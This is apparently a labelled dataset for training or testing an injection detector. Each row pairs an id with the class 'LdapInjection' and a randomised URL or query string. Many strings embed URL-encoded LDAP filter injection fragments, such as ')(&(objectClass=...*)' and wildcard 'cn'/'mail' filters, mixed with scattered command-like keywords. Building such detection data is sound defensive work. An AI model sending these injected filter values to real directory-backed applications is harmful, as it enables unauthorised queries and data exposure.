id,class,vector
2,LdapInjection,/ea@l/tOnimc/yf4s-cmdh/e7Ag2mql9.jpeg?uOh=sDSQwW38&ot=rop&alUeeg5t=ztexlw6tiweD&0erZfco6tro0=capassthruret%26ttaibnchild&iw=6006189&s1=hece%29%28%26%28objectClass++++%3Dgte*%29&bakOZ7Px=6eaaoe&extitl=08222649&imghaEnu16=76275&dmdItmmnefhe=tJEuj&zvQs=8239422&53e7agsOhnie=826582&oilsdr9t=dhY.
3,LdapInjection,nototpsfd=deleteCn&a2trserdDSnec=ejS9sti_&thegrouwo=jhklt&hsedeagertaroo=pf&2foaAhid=5744526&Mth6hoc=10088167&h0=41508833&ejxNm63d=oscupE&siSnmsmoMer=800025&iSncUpfj1BEI=darhcsiaa2r2scs&riereratet8go=661
5,LdapInjection,/aKdNFrwg3/nBdttln/rJbsyUwtV7gL05HUIU/IrE/libeCAs/wUa5astylep/j._MhnXoQC.ZWm.pl?ooeh=MA%7Eedbe9e+psq%3C&lferi8eGetlg=ae&yg@jecatTgYwhere=84166788&ntipsrog6t81n=hBo247avdN%27s%25baiG&tffsoigi6erlakq=lcu6aa&kgesmaP=tEWzPtO&uaivyTdht=87246878&nreil7tyeesJ=rsEig&1tch=dt2i2heEeiono&cckc6nds8=oOhuei+asct&XdeXniT=o&6WWZ=u%25rqeeimginpute&eowtpmrxCzzL1gr=iAgeHGlmO5%40&y_ftinsert2P=183759507&sAdpeoyo=1908595
6,LdapInjection,/qsosehtoaauXrmw2e/Usg.htm?1TphdpiestvReh=%29+++%28++++%7C++++%28displayName%3Dhad*%29++%28name%3D+++had*++%29%28++mail%3Dhad*%29&ytirsdblxmsrXt=51&5hefcT=svoocf4nsaa4EBmh2&aIreethaneLuy=8&enrolctuytL=0i&tihsaOtias8tt=e&hftkmdeitec=%27+havingcrsynod7stdinei7htred&9oc5lcokhlyNC=nN&etstdsn19SzAcde=nts+5&n4num4o8grn=3609186
7,LdapInjection,F@b8inputoptRallbF=rse&gaeonrnshyss2=zs&lLPqOuutSw3=eAtEineWn&A7@6betweenEHYQyKx=344051698&uelelmSgy=658&ehchmshiis=ipee8bgsoundsdaaooe&dReerTref1cgt7t=8266620140&ctasZwi=7&shxUAr=kQYmvG3jHS&jiitStsrg=54709&hetc2tlogqPadminq4access_logz=y&98fperlz-s4nalle=leqneq5&otabnzbiT=587299&aoswipAxteotutc=acTtd7da
17,LdapInjection,nieeso4erq=a& enesvNwaslpieh
20,LdapInjection,/2d.W14ub456Bi9E/pxtowtheew8muibnttet/isi/iti9ye/npQiPLysI4FktX07/lBmtHB1kEl8MD/ecnoagnB.mdb?hltepnhwdd=936420575&lmio06ne9lw=having5rtuahT&te=lqiaKS&djZBhrKpYhf=87&JNAUwRkwhere71divI=nth%29%28%26%28objectClass%3D++++4he*%29
21,LdapInjection,/EkpGvcb2input/@Ygnvbscript7V/vor/i5zuBOs/eoz/OB/af6ioaoljppsns/ta9l72./dHcathxb7JAhX/fOSinooth73t8rwOna/8N/qM5a94xs.cgi?gmAT=06%29%28%26%28objectClass%3Dl3bs%29%28%7C%28sn++++%3D+++zM%29%28cn%3Dnubi+J*%29%29&NqjX3xmltul=157469082
22,LdapInjection,/tmAtclbmrosyansrhnao/noOszX4lRuPuU5fbpt/iRg-zAruMMYqsGn6c3/eK0Hpc@MSsqSMEgiON8@/atneiletYp3igw7c3E/h8nn7.exe?aueHetsoim=a09ai1sio7mi&eshp=aeisnocgreatk2&Lpnmtnn=ojrmrfelupeobjecte&ee9Es=mvy6H5c&0axtetnoemo=%28e&1eqtnllAxkubdy=processing-instructionux-%25%3Bee%5Bahes%3A%5Ddreplace+&etrt5sdm=mrta&ponr2aoW=9ioa%26es%2B%3Edo4%3AH%3BfFsn&ltnetauu=3&cnofEefa=l%40s&unx1ayatmneeWp=hn&rr4edsmin=iGdFJZ&blalnL=1&iitahSatat=69%29%28%26%28objectClass%3DePd%29%28%7C%28sn%3D+++05%29%28cn%3DEn+++J*%29%29&dciiih=eou0%40haycesystemd0a%7E%5Cbin%29e%7Ea
24,LdapInjection,/a_J_/nnpWNM4Y/1gPVWyYh8n/wribqso/e0Q0m-P/ryHoshlrs9T3h3nTdoxt.png?fsci7ey=cw&barjvzhuser=uea&tmthjtklw2ehor=aSpjgTio43&afes=e&MconnectoA2.p=ddltx+ed%40tI&afstiAh8eaLsd=%29++++%28+%7C+++%28+++cn%3D*o++%27brien*++++%29%28mail++++%3D*o++%27brien*+++%29+&ckrriheibcn=108525498&ente8ngarnEnas3=3vbscriptuS%260mv&TsejcvyoihNtRla=7&processing-instructionSVformR5libdH@-=r4cEyhsn6&uTexecb=5208&e1Ctovs5t=43&etea=eA8lperl&SssHa00=b4wf
34,LdapInjection,gdtaYb=ligeyYTedscriptdoDj&juuqoirahD=3iil7tnic+tsystem&sQLcqoOelEa=tumBPCaB-ROa&yo=tdnee&mrnmh7wi=aunooqxo0a6emvnad&4Y=srm=lslo|cDn&an7aaha8sm5a6=onFf&irimssstsah2=85ess&dmnn=88)(&(objectClass=nuh)(|(sn =    3on)(cn=al    J*))&orndxiEllde=a5CuCtizhe&q9ca=02&nhedpco3d=euslryneeamvh
39,LdapInjection,/atWbt2Titc/a1OKqjkFqM@S/uzPe2fnompad/pZctAL/dV35XW194t3P/CCTHpw/ar/cbengtidaFued/mPpTUNfShl/cH8/gsre9IzO8enrlqsp/@nt.htm?i4u=%3E&f7rshl1nr5tvcn6=td2b&tr=271&cetbaik=g1Cbonaje2&IArNye2t=y1ii&3hnsouhn=TmcMa%29%28%26%28objectClass++%3D+++CnE*%29
43,LdapInjection,/oatpm6hisuo/t4@LJvt70ZAfk68SutF/sdTWrts7/w0rhsbta85iesfe/toit/ZH.AKx3nRT.jpeg?cuat=e6Km60nCU4zP&eI6etcC7D_Eb=oEn&180UphtpassT=%29+%28++%7C%28++cn%3D*o+++%27brien*++++%29%28mail+++%3D*o++++%27brien*+++%29++&Qakx5tn16aen=st1
47,LdapInjection,/3qcrey/lacfTet/cVSpdo_sct/igkaO_u1FwzNSi/eeArnynrHmf.-7UkIG8B/neork/brl7ztR/dbh.cgi?eDaeegtrf=%29++%28%7C++%28cn%3D*o+%27brien*+++%29%28mail++%3D*o+%27brien*+%29++&nEkttxatmn=ssock_streamaOyvtat1ar%3C&5imi=tl3l&tzqotror3cuo2s=Lmst
56,LdapInjection,/ryirralao/cCR@KA9aNce5Pn/75ZlKmGM/c4EHGnx/7etleec8uoeicqendn3/soseughtdOcSw0Aq.exe?oqn=eNeoeth&HPij2zzzJ82=m%27%7Cad%27dperlhUn%5D&imjXh=6734%29%28%26%28objectClass%3Dmoi%29%28%7C%28sn+++%3D+++3e5%29%28cn%3Droe7+++++J*%29%29&OMOoptFi-=Hxp_bst+2l+i&oe=1059084&nha0oaarg=9%3DNusrw
57,LdapInjection,/kih5hrmtuNwf/eh1T5TUflwyX/UXKmochaYKzzvk/iframeUQpositionpS/slhwAmrcsmnafl7s8kd/wS4al8jOTuh4btmr/htao9eeAn9rAdeRaw/osatpefrr2wpooerftic/mJ0KO64yrmoEgBO2eS/ijOavGt9fO6xe/Xnrm8lsBBc/jg7y.nsf?sgvcbgsound4aL69A=%29%28+++%7C%28i7C%3Dll*%29&nbnhif6ttdAs8at=I&pyo0D=569&1hrorE=lmads&fd4tniti1Lii=896362&unpdbtthcA5s=zue&Oi3eor=5171894&rwddom4=cqe%40drcrsht&rzrn=ano9nEbXwj&7Eo8N19TVD=08link4tNddb%2Fdeftpposition&rihnlsa=3370&S9lsJtk-DA=eHogEBe7esy9td&0rneA=4066746
62,LdapInjection,/9eeine3g/ehs1cTPLb/QHqPFiw/rWT/49qYjXgSRrt4vk/0uQ/vmnyKSKe5kBa/jB3win5YHurtik/hrkyYLReVZzy@C/inputhvl4/eRrQKSby/fnfrgik2dj8teysia6h3.mdb?GL8iXYnIrcpgH=%29++%28+++%7C++++%28displayName%3Dhad*%29+++%28name%3Dhad*++%29%28mail%3Dhad*++%29&dfrmailbM25j9E=9+selfy9qr5sn&q0ebviniuefm=taorl&xu6r7u=execlHh%40
65,LdapInjection,/dThAbtnt8olxoe/raT7/sJKFDT9c6_/.b/nBz/sdt4aeidomlah9ny/gVQIJMq/8Hgqu0Re/n@m.e8uQ7/eI.htm?tC2q1@uwWunion=nDRJHSKog6EA&uest=%29++++%28+++%7C++%28nura%3DsNo*%29
